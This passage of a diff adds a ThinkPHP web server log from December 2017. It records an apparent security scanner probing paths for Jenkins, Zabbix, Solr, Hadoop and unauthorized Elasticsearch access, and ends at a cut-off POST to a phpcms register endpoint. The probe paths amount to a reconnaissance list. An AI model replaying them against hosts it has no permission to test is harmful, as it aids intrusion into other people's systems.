+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:15+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.023826s][吞吐率：41.97req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:15+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.024592s][吞吐率：40.66req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:19+08:00 ] 172.17.195.153 140.205.225.185 GET /hwi/
+[ log ] 39.106.4.226:80/hwi/ [运行时间：0.011274s][吞吐率：88.70req/s] [内存消耗：1,508.93kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'hwi',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:31+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.023743s][吞吐率：42.12req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:38+08:00 ] 172.17.195.153 140.205.225.185 GET /master-status
+[ log ] 39.106.4.226:80/master-status [运行时间：0.011714s][吞吐率：85.37req/s] [内存消耗：1,509.02kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'master-status',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:39+08:00 ] 172.17.195.153 140.205.225.185 GET /dfshealth.html
+[ log ] 39.106.4.226:80/dfshealth.html [运行时间：0.011237s][吞吐率：88.99req/s] [内存消耗：1,508.91kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dfshealth',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:43+08:00 ] 172.17.195.153 140.205.225.185 GET /http://39.106.4.226:8080
+[ log ] 39.106.4.226:80/http://39.106.4.226:8080 [运行时间：0.010850s][吞吐率：92.17req/s] [内存消耗：1,508.97kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'http:',
+    1 => '39.106.4.226:8080',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:44+08:00 ] 172.17.195.153 140.205.225.185 GET /http://39.106.4.226:8081
+[ log ] 39.106.4.226:80/http://39.106.4.226:8081 [运行时间：0.011073s][吞吐率：90.31req/s] [内存消耗：1,508.97kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'http:',
+    1 => '39.106.4.226:8081',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:44+08:00 ] 172.17.195.153 140.205.225.185 GET /http://39.106.4.226:8090
+[ log ] 39.106.4.226:80/http://39.106.4.226:8090 [运行时间：0.011575s][吞吐率：86.39req/s] [内存消耗：1,508.97kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'http:',
+    1 => '39.106.4.226:8090',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:45+08:00 ] 172.17.195.153 140.205.225.185 GET /clusters.jsf
+[ log ] 39.106.4.226:80/clusters.jsf [运行时间：0.011419s][吞吐率：87.57req/s] [内存消耗：1,509.00kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'clusters.jsf',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:48+08:00 ] 172.17.195.153 140.205.225.185 GET /about/
+[ log ] 39.106.4.226:80/about/ [运行时间：0.010892s][吞吐率：91.81req/s] [内存消耗：1,508.89kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'about',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:49+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.023565s][吞吐率：42.44req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:50+08:00 ] 172.17.195.153 140.205.225.185 GET /jenkins/
+[ log ] 39.106.4.226:80/jenkins/ [运行时间：0.010824s][吞吐率：92.39req/s] [内存消耗：1,508.97kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'jenkins',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:51+08:00 ] 172.17.195.153 140.205.225.185 GET /zabbix/
+[ log ] 39.106.4.226:80/zabbix/ [运行时间：0.011646s][吞吐率：85.87req/s] [内存消耗：1,508.93kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'zabbix',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:52+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.023920s][吞吐率：41.81req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:52+08:00 ] 172.17.195.153 140.205.225.185 GET /solr/
+[ log ] 39.106.4.226:80/solr/ [运行时间：0.011639s][吞吐率：85.92req/s] [内存消耗：1,508.91kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'solr',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:53+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.025435s][吞吐率：39.32req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:56+08:00 ] 172.17.195.153 140.205.225.185 GET /info
+[ log ] 39.106.4.226:80/info [运行时间：0.011603s][吞吐率：86.18req/s] [内存消耗：1,508.93kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'info',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:14+08:00 ] 172.17.195.153 140.205.225.185 GET /warning
+[ log ] 39.106.4.226:80/warning [运行时间：0.010842s][吞吐率：92.23req/s] [内存消耗：1,508.93kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'warning',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:19+08:00 ] 172.17.195.153 140.205.225.185 GET /pleasereadthis
+[ log ] 39.106.4.226:80/pleasereadthis [运行时间：0.011659s][吞吐率：85.77req/s] [内存消耗：1,509.01kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'pleasereadthis',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:23+08:00 ] 172.17.195.153 140.205.225.185 GET /please_read/_search
+[ log ] 39.106.4.226:80/please_read/_search [运行时间：0.011549s][吞吐率：86.59req/s] [内存消耗：1,509.33kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'please_read',
+    1 => '_search',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:27+08:00 ] 172.17.195.153 140.205.225.185 GET /dfshealth.jsp
+[ log ] 39.106.4.226:80/dfshealth.jsp [运行时间：0.011095s][吞吐率：90.13req/s] [内存消耗：1,509.02kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dfshealth.jsp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:27+08:00 ] 172.17.195.153 140.205.225.185 GET /hadoop/dfshealth.jsp
+[ log ] 39.106.4.226:80/hadoop/dfshealth.jsp [运行时间：0.011212s][吞吐率：89.19req/s] [内存消耗：1,509.22kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'hadoop',
+    1 => 'dfshealth.jsp',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:42+08:00 ] 172.17.195.153 140.205.225.185 POST /dantkquscvxl
+[ log ] 39.106.4.226:80/dantkquscvxl [运行时间：0.011650s][吞吐率：85.84req/s] [内存消耗：1,508.46kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dantkquscvxl',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => '39.106.4.226:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '22',
+)
+[ info ] [ PARAM ] array (
+  '{"aliyun":_"vulntest"}' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:42+08:00 ] 172.17.195.153 140.205.225.185 GET /dantkquscvxl
+[ log ] 39.106.4.226:80/dantkquscvxl [运行时间：0.011416s][吞吐率：87.60req/s] [内存消耗：1,509.03kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dantkquscvxl',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => '39.106.4.226:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:28:42+08:00 ] 172.17.195.153 140.205.225.185 DELETE /dantkquscvxl
+[ log ] 39.106.4.226:80/dantkquscvxl [运行时间：0.011424s][吞吐率：87.53req/s] [内存消耗：1,508.70kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dantkquscvxl',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => '39.106.4.226:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T22:10:08+08:00 ] 172.17.195.153 118.190.210.245 GET /
+[ log ] xinchumenye.com/ [运行时间：0.024019s][吞吐率：41.63req/s] [内存消耗：2,781.77kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Baiduspider+(+http://www.baidu.com/search/spider.htm)',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn,en-us;q=0.5',
+  'host' => 'xinchumenye.com',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T23:17:23+08:00 ] 172.17.195.153 217.127.234.235 GET /
+[ log ] xinchumenye.com/ [运行时间：0.024557s][吞吐率：40.72req/s] [内存消耗：2,781.79kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'xinchumenye.com',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.13.0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T23:38:18+08:00 ] 172.17.195.153 140.205.225.195 POST /index.php?m=member&c=index&a=register&siteid=1
